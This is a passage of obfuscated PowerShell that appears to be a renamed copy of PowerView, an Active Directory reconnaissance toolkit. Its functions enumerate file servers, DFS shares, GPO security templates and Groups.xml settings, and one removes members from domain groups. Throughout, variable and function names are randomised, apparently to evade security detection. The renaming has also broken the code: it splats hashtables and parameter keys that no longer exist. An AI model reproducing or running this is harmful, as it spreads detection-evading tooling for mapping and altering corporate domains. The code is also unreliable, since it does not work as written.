        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $yQCTDBqh99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $lmVKeZxb99 = @{
            'Identity' = $lmPsrtYT99
        }
        if ($PSBoundParameters['Domain']) { $lmVKeZxb99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Credential']) { $lmVKeZxb99['Credential'] = $tYWiEqAT99 }

        $vOXddvUR99 = vignetting @ContextArguments

        if ($vOXddvUR99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($vOXddvUR99.Context, $vOXddvUR99.Identity)
            }
            catch {
                Write-Warning "[misgoverned] Error finding the group identity '$lmPsrtYT99' : $_"
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($VoXrAEUj99 in $yQCTDBqh99) {
                if ($VoXrAEUj99 -match '.+\\.+') {
                    $lmVKeZxb99['Identity'] = $VoXrAEUj99
                    $taPnwxkO99 = vignetting @ContextArguments
                    if ($taPnwxkO99) {
                        $CgAKgSWG99 = $taPnwxkO99.Identity
                    }
                }
                else {
                    $taPnwxkO99 = $vOXddvUR99
                    $CgAKgSWG99 = $VoXrAEUj99
                }
                Write-Verbose "[misgoverned] Removing member '$VoXrAEUj99' from group '$lmPsrtYT99'"
                $VoXrAEUj99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($taPnwxkO99.Context, $CgAKgSWG99)
                $Group.Members.Remove($VoXrAEUj99)
                $Group.Save()
            }
        }
    }
}


function BSD {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function bonsai {
            Param([String]$Path)

            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }

        $nlvvSWoK99 = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($ydWBwabR99 in $JXWXuoyG99) {
                $nlvvSWoK99['Domain'] = $ydWBwabR99
                $BbNqTbLk99 = misbehaves @SearcherArguments
                $(ForEach($fmZVTYjw99 in $BbNqTbLk99.FindAll()) {if ($fmZVTYjw99.Properties['homedirectory']) {bonsai($fmZVTYjw99.Properties['homedirectory'])}if ($fmZVTYjw99.Properties['scriptpath']) {bonsai($fmZVTYjw99.Properties['scriptpath'])}if ($fmZVTYjw99.Properties['profilepath']) {bonsai($fmZVTYjw99.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $BbNqTbLk99 = misbehaves @SearcherArguments
            $(ForEach($fmZVTYjw99 in $BbNqTbLk99.FindAll()) {if ($fmZVTYjw99.Properties['homedirectory']) {bonsai($fmZVTYjw99.Properties['homedirectory'])}if ($fmZVTYjw99.Properties['scriptpath']) {bonsai($fmZVTYjw99.Properties['scriptpath'])}if ($fmZVTYjw99.Properties['profilepath']) {bonsai($fmZVTYjw99.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}


function Kojak {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $sFzYevsg99 = 'All'
    )

    BEGIN {
        $nlvvSWoK99 = @{}
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }

        function trustworthy {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )

            $bin = $Pkt
            $HzovtxjG99 = [bitconverter]::ToUInt32($bin[0..3],0)
            $JSUQSPhs99 = [bitconverter]::ToUInt32($bin[4..7],0)
            $ZdQQYlky99 = 8
            $gIUIyrAN99 = @()
            for($i=1; $i -le $JSUQSPhs99; $i++){
                $sqCeEExF99 = $ZdQQYlky99
                $JeTIQyOy99 = $ZdQQYlky99 + 1
                $rWFGmkcN99 = [bitconverter]::ToUInt16($bin[$sqCeEExF99..$JeTIQyOy99],0)

                $WJpjXQwB99 = $JeTIQyOy99 + 1
                $WxbHTseX99 = $WJpjXQwB99 + $rWFGmkcN99 - 1
                $XMlowWIf99 = [System.Text.Encoding]::Unicode.GetString($bin[$WJpjXQwB99..$WxbHTseX99])

                $BIZnVJvP99 = $WxbHTseX99 + 1
                $iGbZhifG99 = $BIZnVJvP99 + 3
                $sINLsWuo99 = [bitconverter]::ToUInt32($bin[$BIZnVJvP99..$iGbZhifG99],0)

                $QWjgbCzy99 = $iGbZhifG99 + 1
                $HgKtYgVK99 = $QWjgbCzy99 + $sINLsWuo99 - 1
                $AXAMvAeA99 = $bin[$QWjgbCzy99..$HgKtYgVK99]
                switch -wildcard ($XMlowWIf99) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        $xUxdnvSJ99 = 0
                        $jlMSdRUX99 = 15
                        $YcuzuXaV99 = [byte[]]$AXAMvAeA99[$xUxdnvSJ99..$jlMSdRUX99]
                        $guid = New-Object Guid(,$YcuzuXaV99) # should match $WPuoJTFO99
                        $TJIyhyhY99 = $jlMSdRUX99 + 1
                        $TmJsZsOi99 = $TJIyhyhY99 + 1
                        $dlRZcNoQ99 = [bitconverter]::ToUInt16($AXAMvAeA99[$TJIyhyhY99..$TmJsZsOi99],0)
                        $aqzxyAyd99 = $TmJsZsOi99 + 1
                        $orulciyM99 = $aqzxyAyd99 + $dlRZcNoQ99 - 1
                        $SShlZgxI99 = [System.Text.Encoding]::Unicode.GetString($AXAMvAeA99[$aqzxyAyd99..$orulciyM99])

                        $gMhjXLKH99 = $orulciyM99 + 1
                        $vkYPvSMP99 = $gMhjXLKH99 + 1
                        $zJFXLwBz99 = [bitconverter]::ToUInt16($AXAMvAeA99[$gMhjXLKH99..$vkYPvSMP99],0)
                        $RCEAKFIi99 = $vkYPvSMP99 + 1
                        $XNffENay99 = $RCEAKFIi99 + $zJFXLwBz99 - 1
                        $sQQAvpBR99 = [System.Text.Encoding]::Unicode.GetString($AXAMvAeA99[$RCEAKFIi99..$XNffENay99])

                        $mTuExXbq99 = $XNffENay99 + 1
                        $bFkDVDgr99 = $mTuExXbq99 + 3
                        $type = [bitconverter]::ToUInt32($AXAMvAeA99[$mTuExXbq99..$bFkDVDgr99],0)

                        $KWuENXUO99 = $bFkDVDgr99 + 1
                        $VGQFVDNj99 = $KWuENXUO99 + 3
                        $state = [bitconverter]::ToUInt32($AXAMvAeA99[$KWuENXUO99..$VGQFVDNj99],0)

                        $xZnSkAKu99 = $VGQFVDNj99 + 1
                        $HoJREMeN99 = $xZnSkAKu99 + 1
                        $FHwljegh99 = [bitconverter]::ToUInt16($AXAMvAeA99[$xZnSkAKu99..$HoJREMeN99],0)
                        $ZWqnBDBx99 = $HoJREMeN99 + 1
                        $KsIoBOpF99 = $ZWqnBDBx99 + $FHwljegh99 - 1
                        if ($FHwljegh99 -gt 0)  {
                            $YbDVwsXB99 = [System.Text.Encoding]::Unicode.GetString($AXAMvAeA99[$ZWqnBDBx99..$KsIoBOpF99])
                        }
                        $muKFPrVW99 = $KsIoBOpF99 + 1
                        $PNomDckf99 = $muKFPrVW99 + 7
                        $BEwYDzjz99 = $AXAMvAeA99[$muKFPrVW99..$PNomDckf99] #dword lowDateTime #dword highdatetime
                        $VlJbyBbD99 = $PNomDckf99 + 1
                        $OKlKqXUv99 = $VlJbyBbD99 + 7
                        $bSlEjTYH99 = $AXAMvAeA99[$VlJbyBbD99..$OKlKqXUv99]
                        $WRlIFGbX99 = $OKlKqXUv99 + 1
                        $QXhfrmCO99 = $WRlIFGbX99 + 7
                        $zBCotXJQ99 = $AXAMvAeA99[$WRlIFGbX99..$QXhfrmCO99]
                        $IpbOHRda99 = $QXhfrmCO99  + 1
                        $vaAKfepd99 = $IpbOHRda99 + 3
                        $sFzYevsg99 = [bitconverter]::ToUInt32($AXAMvAeA99[$IpbOHRda99..$vaAKfepd99],0)

                        $BqdPggcp99 = $vaAKfepd99 + 1
                        $BolPDuAB99 = $BqdPggcp99 + 3
                        $SOiIikiP99 = [bitconverter]::ToUInt32($AXAMvAeA99[$BqdPggcp99..$BolPDuAB99],0)

                        $xpEnoeXo99 = $BolPDuAB99 + 1
                        $AHLagoVX99 = $xpEnoeXo99 + $SOiIikiP99 - 1
                        $wRJUMkcb99 = $AXAMvAeA99[$xpEnoeXo99..$AHLagoVX99]
                        $YbTsstTu99 = $AHLagoVX99 + 1
                        $NmZbTIvk99 = $YbTsstTu99 + 3
                        $dQDRyocK99 = [bitconverter]::ToUInt32($AXAMvAeA99[$YbTsstTu99..$NmZbTIvk99],0)

                        $pRFNobpa99 = $NmZbTIvk99 + 1
                        $pYFzzKfX99 = $pRFNobpa99 + $dQDRyocK99 - 1
                        $mpHvKKvk99 = $AXAMvAeA99[$pRFNobpa99..$pYFzzKfX99]
                        $sLpdOaJE99 = $pYFzzKfX99 + 1
                        $QrrzlgIv99 = $sLpdOaJE99 + 3
                        $QjfWXiSc99 = [bitconverter]::ToUInt32($AXAMvAeA99[$sLpdOaJE99..$QrrzlgIv99],0)

                        $KQvhyInY99 = 0
                        $MGRnLoTv99 = $KQvhyInY99 + 3
                        $dlLsfBgE99 = [bitconverter]::ToUInt32($wRJUMkcb99[$KQvhyInY99..$MGRnLoTv99],0)
                        $uRDEtgxG99 = $MGRnLoTv99 + 1

                        for($j=1; $j -le $dlLsfBgE99; $j++){
                            $DVNQERZu99 = $uRDEtgxG99
                            $FxWJwcqf99 = $DVNQERZu99 + 3
                            $JBHwygbE99 = [bitconverter]::ToUInt32($wRJUMkcb99[$DVNQERZu99..$FxWJwcqf99],0)
                            $oKPbDcEL99 = $FxWJwcqf99 + 1
                            $glnJFElF99 = $oKPbDcEL99 + 7
                            $PYjnHRoC99 = $wRJUMkcb99[$oKPbDcEL99..$glnJFElF99]
                            $AaLFbOTf99 = $glnJFElF99 + 1
                            $xwHirOnP99 = $AaLFbOTf99 + 3
                            $IUwmEtSX99 = [bitconverter]::ToUInt32($wRJUMkcb99[$AaLFbOTf99..$xwHirOnP99],0)

                            $ugPCBGpn99 = $xwHirOnP99 + 1
                            $oDNFPWiy99 = $ugPCBGpn99 + 3
                            $EMmGjSuZ99 = [bitconverter]::ToUInt32($wRJUMkcb99[$ugPCBGpn99..$oDNFPWiy99],0)

                            $iiLqfisK99 = $oDNFPWiy99 + 1
                            $ZBUWJvGS99 = $iiLqfisK99 + 1
                            $eBjDAVyx99 = [bitconverter]::ToUInt16($wRJUMkcb99[$iiLqfisK99..$ZBUWJvGS99],0)

                            $TxFhLjKz99 = $ZBUWJvGS99 + 1
                            $RsagRSGa99 = $TxFhLjKz99 + $eBjDAVyx99 - 1
                            $GNCiGyeo99 = [System.Text.Encoding]::Unicode.GetString($wRJUMkcb99[$TxFhLjKz99..$RsagRSGa99])

                            $phYufIEv99 = $RsagRSGa99 + 1
                            $aPzkVeTA99 = $phYufIEv99 + 1
                            $ejhwGlfR99 = [bitconverter]::ToUInt16($wRJUMkcb99[$phYufIEv99..$aPzkVeTA99],0)
                            $cXjvksLR99 = $aPzkVeTA99 + 1
                            $uoqxKCMF99 = $cXjvksLR99 + $ejhwGlfR99 - 1
                            $TDWFoWzp99 = [System.Text.Encoding]::Unicode.GetString($wRJUMkcb99[$cXjvksLR99..$uoqxKCMF99])

                            $PugtThBi99 += "\\$GNCiGyeo99\$TDWFoWzp99"
                            $uRDEtgxG99 = $uoqxKCMF99 + 1
                        }
                    }
                }
                $ZdQQYlky99 = $HgKtYgVK99 + 1
                $WuXrXkci99 = @{
                    'Name' = $XMlowWIf99
                    'Prefix' = $SShlZgxI99
                    'TargetList' = $PugtThBi99
                }
                $gIUIyrAN99 += New-Object -TypeName PSObject -Property $WuXrXkci99
                $SShlZgxI99 = $Null
                $XMlowWIf99 = $Null
                $PugtThBi99 = $Null
            }

            $zElORrPl99 = @()
            $gIUIyrAN99 | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $zElORrPl99 += $_.split('\')[2]
                    }
                }
            }

            $zElORrPl99
        }

        function stoppers {
            [CmdletBinding()]
            Param(
                [String]
                $JXWXuoyG99,

                [String]
                $pQbfmzwr99,

                [String]
                $tqOJuvTN99,

                [String]
                $lGlQEcNF99 = 'Subtree',

                [Int]
                $ixOvvLXO99 = 200,

                [Int]
                $EQlXfKFO99,

                [Switch]
                $adpABMuf99,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
            )

            $vFIxuAqj99 = misbehaves @PSBoundParameters

            if ($vFIxuAqj99) {
                $BvtcfRmI99 = @()
                $vFIxuAqj99.filter = '(&(objectClass=fTDfs))'

                try {
                    $DEbeunXw99 = $vFIxuAqj99.FindAll()
                    $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                        $hqDcSuel99 = $_.Properties
                        $RMPITpfP99 = $hqDcSuel99.remoteservername
                        $Pkt = $hqDcSuel99.pkt

                        $BvtcfRmI99 += $RMPITpfP99 | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$hqDcSuel99.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Kojak] stoppers error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($DEbeunXw99) {
                        try { $DEbeunXw99.dispose() }
                        catch {
                            Write-Verbose "[Kojak] stoppers error disposing of the Results object: $_"
                        }
                    }
                    $vFIxuAqj99.dispose()

                    if ($pkt -and $pkt[0]) {
                        trustworthy $pkt[0] | ForEach-Object {
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$hqDcSuel99.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[Kojak] stoppers error : $_"
                }
                $BvtcfRmI99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }

        function vectors {
            [CmdletBinding()]
            Param(
                [String]
                $JXWXuoyG99,

                [String]
                $pQbfmzwr99,

                [String]
                $tqOJuvTN99,

                [String]
                $lGlQEcNF99 = 'Subtree',

                [Int]
                $ixOvvLXO99 = 200,

                [Int]
                $EQlXfKFO99,

                [Switch]
                $adpABMuf99,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
            )

            $vFIxuAqj99 = misbehaves @PSBoundParameters

            if ($vFIxuAqj99) {
                $BvtcfRmI99 = @()
                $vFIxuAqj99.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $vFIxuAqj99.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    $DEbeunXw99 = $vFIxuAqj99.FindAll()
                    $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                        $hqDcSuel99 = $_.Properties
                        $PugtThBi99 = $hqDcSuel99.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($PugtThBi99[2..($PugtThBi99.Length-1)])
                        $BvtcfRmI99 += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $qaSOfuPs99 = $_.InnerText
                                if ( $qaSOfuPs99.Contains('\') ) {
                                    $eUansBhn99 = $qaSOfuPs99.split('\')[3]
                                    $XZVBpgKL99 = $hqDcSuel99.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$eUansBhn99$XZVBpgKL99";'RemoteServerName'=$qaSOfuPs99.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Kojak] vectors error in parsing target : $_"
                            }
                        }
                    }
                    if ($DEbeunXw99) {
                        try { $DEbeunXw99.dispose() }
                        catch {
                            Write-Verbose "[Kojak] Error disposing of the Results object: $_"
                        }
                    }
                    $vFIxuAqj99.dispose()
                }
                catch {
                    Write-Warning "[Kojak] vectors error : $_"
                }
                $BvtcfRmI99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        $BvtcfRmI99 = @()

        if ($PSBoundParameters['Domain']) {
            ForEach ($ydWBwabR99 in $JXWXuoyG99) {
                $nlvvSWoK99['Domain'] = $ydWBwabR99
                if ($sFzYevsg99 -match 'all|1') {
                    $BvtcfRmI99 += stoppers @SearcherArguments
                }
                if ($sFzYevsg99 -match 'all|2') {
                    $BvtcfRmI99 += vectors @SearcherArguments
                }
            }
        }
        else {
            if ($sFzYevsg99 -match 'all|1') {
                $BvtcfRmI99 += stoppers @SearcherArguments
            }
            if ($sFzYevsg99 -match 'all|2') {
                $BvtcfRmI99 += vectors @SearcherArguments
            }
        }

        $BvtcfRmI99 | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}



function Casandra {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $RSiSIwpM99,

        [Switch]
        $FwMcWEEs99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wOpatEWl99 = @{}
    }

    PROCESS {
        try {
            if (($RSiSIwpM99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $fmBOSHFL99 = "\\$((New-Object System.Uri($RSiSIwpM99)).Host)\SYSVOL"
                if (-not $wOpatEWl99[$fmBOSHFL99]) {
                    Kamehameha -Path $fmBOSHFL99 -Credential $tYWiEqAT99
                    $wOpatEWl99[$fmBOSHFL99] = $True
                }
            }

            $ERunDoxX99 = $RSiSIwpM99
            if (-not $ERunDoxX99.EndsWith('.inf')) {
                $ERunDoxX99 += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            Write-Verbose "[Casandra] Parsing GptTmplPath: $ERunDoxX99"

            if ($PSBoundParameters['OutputObject']) {
                $wNZREnml99 = brushed -Path $ERunDoxX99 -OutputObject -ErrorAction Stop
                if ($wNZREnml99) {
                    $wNZREnml99 | Add-Member Noteproperty 'Path' $ERunDoxX99
                    $wNZREnml99
                }
            }
            else {
                $wNZREnml99 = brushed -Path $ERunDoxX99 -ErrorAction Stop
                if ($wNZREnml99) {
                    $wNZREnml99['Path'] = $ERunDoxX99
                    $wNZREnml99
                }
            }
        }
        catch {
            Write-Verbose "[Casandra] Error parsing $ERunDoxX99 : $_"
        }
    }

    END {
        $wOpatEWl99.Keys | ForEach-Object { refrigerants -Path $_ }
    }
}


function elementary {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $BomZzqxD99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wOpatEWl99 = @{}
    }

    PROCESS {
        try {
            if (($BomZzqxD99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $fmBOSHFL99 = "\\$((New-Object System.Uri($BomZzqxD99)).Host)\SYSVOL"
                if (-not $wOpatEWl99[$fmBOSHFL99]) {
                    Kamehameha -Path $fmBOSHFL99 -Credential $tYWiEqAT99
                    $wOpatEWl99[$fmBOSHFL99] = $True
                }
            }

            [XML]$tnpCHukr99 = Get-Content -Path $BomZzqxD99 -ErrorAction Stop

            $tnpCHukr99 | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $owBLZLPg99 = $_.Properties.groupName

                $CpfORWIL99 = $_.Properties.groupSid
                if (-not $CpfORWIL99) {
                    if ($owBLZLPg99 -match 'Administrators') {
                        $CpfORWIL99 = 'S-1-5-32-544'
                    }
                    elseif ($owBLZLPg99 -match 'Remote Desktop') {
                        $CpfORWIL99 = 'S-1-5-32-555'
                    }
                    elseif ($owBLZLPg99 -match 'Guests') {
                        $CpfORWIL99 = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $CpfORWIL99 = nonstick -ObjectName $owBLZLPg99 -Credential $tYWiEqAT99
                        }
                        else {
                            $CpfORWIL99 = nonstick -ObjectName $owBLZLPg99
                        }
                    }
                }

                $yQCTDBqh99 = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }

                if ($yQCTDBqh99) {
                    if ($_.filters) {
                        $GksFLwoy99 = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $GksFLwoy99 = $Null
                    }

                    if ($yQCTDBqh99 -isnot [System.Array]) { $yQCTDBqh99 = @($yQCTDBqh99) }

                    $PDzWTsws99 = New-Object PSObject
                    $PDzWTsws99 | Add-Member Noteproperty 'GPOPath' $MtFKUAgO99
                    $PDzWTsws99 | Add-Member Noteproperty 'Filters' $GksFLwoy99
                    $PDzWTsws99 | Add-Member Noteproperty 'GroupName' $owBLZLPg99
                    $PDzWTsws99 | Add-Member Noteproperty 'GroupSID' $CpfORWIL99
                    $PDzWTsws99 | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $PDzWTsws99 | Add-Member Noteproperty 'GroupMembers' $yQCTDBqh99
                    $PDzWTsws99.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $PDzWTsws99
                }
            }
        }
        catch {
            Write-Verbose "[elementary] Error parsing $MtFKUAgO99 : $_"
        }
    }

    END {
        $wOpatEWl99.Keys | ForEach-Object { refrigerants -Path $_ }
    }
}


function straights {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $lmPsrtYT99,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $EzsLgvcu99,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $CgAKgSWG99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kXEJXDlJ99,

        [Switch]
        $adpABMuf99,

        [Alias('ReturnOne')]
        [Switch]
        $dmDYWlHe99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $nlvvSWoK99 = @{}
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Properties']) { $nlvvSWoK99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['SearchBase']) { $nlvvSWoK99['SearchBase'] = $pQbfmzwr99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $nlvvSWoK99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['SecurityMasks']) { $nlvvSWoK99['SecurityMasks'] = $kXEJXDlJ99 }
        if ($PSBoundParameters['Tombstone']) { $nlvvSWoK99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        $krAaRgdg99 = misbehaves @SearcherArguments
    }

    PROCESS {
        if ($krAaRgdg99) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $tgunRFvL99 = @()
                if ($nlvvSWoK99['Properties']) {
                    $wkdNSvfa99 = $nlvvSWoK99['Properties']
                }
                $nlvvSWoK99['Properties'] = 'distinguishedname,dnshostname'
                $bvgoxpSV99 = $Null

                if ($PSBoundParameters['ComputerIdentity']) {
                    $nlvvSWoK99['Identity'] = $EzsLgvcu99
                    $BoJggNks99 = undergrad @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $BoJggNks99) {
                        Write-Verbose "[straights] Computer '$EzsLgvcu99' not found!"
                    }
                    $PpMDEFqG99 = $BoJggNks99.distinguishedname
                    $bvgoxpSV99 = $BoJggNks99.dnshostname
